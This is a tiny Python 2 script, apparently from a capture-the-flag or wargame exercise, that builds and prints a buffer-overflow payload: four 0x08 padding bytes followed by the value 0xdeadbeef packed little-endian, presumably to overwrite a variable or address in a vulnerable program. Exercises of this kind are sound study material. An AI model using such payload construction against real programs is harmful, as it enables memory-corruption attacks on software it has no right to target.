import os
from struct import *

p = lambda x : pack("<L", x)

deadbeef = p(0xdeadbeef)

payload = ""
payload += "\x08"*4
payload += deadbeef

print payload